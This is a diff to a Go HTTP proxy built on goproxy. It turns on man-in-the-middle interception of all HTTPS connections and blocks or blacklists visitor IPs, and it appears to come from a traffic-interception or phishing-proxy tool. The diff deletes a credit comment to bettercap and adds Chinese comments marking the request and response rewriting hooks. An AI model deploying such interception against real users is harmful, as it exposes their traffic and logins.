@@ -1,10 +1,3 @@
-/*
-
-This source file is a modified version of what was taken from the amazing bettercap (https://github.com/bettercap/bettercap) project.
-Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of code!
-
-*/
-
 package core
 
 import (
@@ -138,6 +131,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
 
+	// 请求前修改
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
 			ps := &ProxySession{
@@ -155,13 +149,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if strings.Contains(from_ip, ":") {
 				from_ip = strings.Split(from_ip, ":")[0]
 			}
+
 			if p.cfg.GetBlacklistMode() != "off" {
+
 				if p.bl.IsBlacklisted(from_ip) {
 					if p.bl.IsVerbose() {
 						log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
 					}
 					return p.blockRequest(req)
 				}
+
 				if p.cfg.GetBlacklistMode() == "all" {
 					err := p.bl.AddIP(from_ip)
 					if p.bl.IsVerbose() {
@@ -174,6 +171,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 					return p.blockRequest(req)
 				}
+
 			}
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
@@ -777,6 +775,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			return req, nil
 		})
 
+	// 返回修改
 	p.Proxy.OnResponse().
 		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
 			if resp == nil {
